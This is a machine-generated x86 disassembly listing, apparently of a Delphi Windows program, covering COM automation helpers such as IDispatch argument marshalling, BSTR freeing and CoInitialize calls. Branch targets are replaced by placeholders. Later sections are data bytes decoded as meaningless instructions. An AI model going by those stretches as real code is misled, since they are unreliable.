xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4648ac
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_464b7c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404e30
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404e30
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4648b3
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404e0c
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404e30
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40fb58
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_4648e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
pop ecx
pop ecx
pop ebp
retn
sub_464914
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408994
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_464030
push ebp
call sub_4648e0
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_464a0c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_4649f4
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_464914
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46459c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f2ec
sub_464aa8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_464b6d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_463eac
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_404290
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_404290
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_404290
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_463f7c
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b74
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40402c
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4039c0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404ba8
jmp r-xdata
sub_464b98
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_464b88
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_464aa8
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_464c7c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_464b98
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_464cad ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f2ec
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_464d58
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_417868
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_417868
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_464dd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464e46
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e4d
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404abc
call CoUninitialize
sub_464e50
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_464398
mov eax sub_464a0c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_464c7c
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_464d58
sub_464ea8
push 0xe1004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_464ef5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464efc
retn
sub_464f08
or al 0x4f
inc esi
add [ ecx ] dl
or eax 0x72615654
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add al bh
adc [ eax ] al
or al 0x0
add [ eax ] al
clc
adc [ eax ] al
or [ edi + 0x6c ] ecx
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
cli
dec edi
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
cli
dec edi
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov al [ 0x16004650 ]
push eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004650 ] ah
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
jl r-xdata
jb r-xdata
add ah ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_464ef5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464efc
retn
inc eax
add [ edi + ecx * 2 ] bh
inc esi
inc eax
add ah cl
add [ esp + 0x4 ] 0xffffffb4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244690ce
xor al [ eax ]
adc al 0x54
push ebx
jb r-xdata
add [ ebx ] al
or al 0x54
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
cmp [ edi + 0x46 ] cl
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
add [ eax ] al
jb r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
sub al [ eax ]
aam 0x55
inc esi
add al dl
push ebp
inc esi
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
inc esp
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
inc edx
add [ eax + 0x57 ] ah
inc esi
add [ eax ] cl
push ebp
inc esi
add [ edx + ebp ] ch
inc eax
add ah dl
push ebp
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x5c469182
add [ eax ] al
add [ eax ] al
jbe r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_464f08 ]
call sub_40526c
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4050b8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp r-xdata
outsb
jae r-xdata
int3
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosb [ edi ]
push ecx
inc esi
add [ eax ] dl
add [ eax ] al
xor al 0x8d
inc ecx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
add [ eax ] al
add [ eax ] al
cwde
push ecx
inc esi
add [ ecx + edx * 2 + 0x46 ] bh
outsb
je r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
push ebp
inc esi
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ ebp + edx * 2 + 0xa300046 ] ch
inc edx
add [ ebx + ecx + 0x42 ] dh
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
pop esp
inc eax
add [ ecx + edx * 2 + 0xa070046 ] bh
push esp
dec edi
insb
push ebx
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
fist [ eax + 0x46 ]
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
out 0x50 eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb9af ] bl
push ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x50004651 ] ch
add [ eax ] al
add [ ecx * 4 + 0xe980041 ] dh
inc edx
add [ eax - 0x27ffbfcc ] cl
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_465788
add [ ebx - 0x3affb9b1 ] bh
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
outsd
je r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f614
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f614
inc ebx
dec edi
jne r-xdata
jmp r-xdata
dec edi
inc esi
add bh cl
dec edi
inc esi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
dec edi
inc esi
add [ ecx - 0x44ffb9b1 ] dh
dec edi
inc esi
add ch al
jb r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ ebx ] cl
inc ebx
push ecx
inc esi
add [ eax ] dh
mov es [ ecx ]
add eax 0x6c4f0900
push ebx
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov cl 0x4f
inc esi
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_4032e8
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_464f08 ]
call sub_40526c
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ sub_464f08 ]
call sub_40538c
retn
inc edi
inc edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add [ edi + edx * 2 + 0x46 ] al
add [ edi + edx * 2 + 0x46 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
inc esp
push edi
inc esi
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f614
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f614
je r-xdata
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
outsd
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + edi + 0x4f ] si
inc esi
add [ edi + edx * 2 ] ch
inc esi
add [ eax + 0x57 ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_465284
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_4032e8
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_465308
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_465798
sub_465508
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_465258
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46555c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_4654f8
mov eax [ esi + 0x38 ]
push eax
call sub_465308
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
